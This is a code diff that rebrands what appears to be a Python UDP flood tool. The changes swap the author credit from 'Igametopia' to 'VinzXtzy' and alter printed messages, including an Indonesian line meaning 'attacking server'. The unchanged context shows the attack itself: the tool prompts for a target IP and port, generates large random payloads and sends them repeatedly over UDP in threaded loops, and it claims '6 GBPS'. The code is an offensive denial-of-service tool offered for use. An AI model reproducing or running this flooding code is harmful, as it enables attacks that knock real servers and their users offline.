@@ -17,9 +17,9 @@ print("""
 ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝                                                                                               
                                                                              """)
 
-print("Tools Version : Personal")
-print("Tools By : Igametopia")
-print("Tools Personal Max Send 6 GBPS")
+print("Tools Version : igame")
+print("Tools By : VinzXtzy")
+print("Tools VinzXtzy Max Send 6 GBPS")
 
 ip = str(input(">> IP Address :"))
 port = int(input(">> Port : "))
@@ -37,7 +37,7 @@ def run():
 				s.sendto(data,addr)
 			print(i +" Sent!!!")
 		except:
-			print("[!] Error!!!")
+			print("[!] Mampus!!!")
 
 def run2():
 	data = random._urandom(100048)
@@ -131,7 +131,7 @@ def run2():
 			print(i +" Sent!!!")
 		except:
 			s.close()
-			print("PERSONAL TOOLS ATTACK " + ip)
+			print("SEDANG MENYERANG SERVER!! " + ip)
 
 for y in range(threads):
 	if choice == "y":
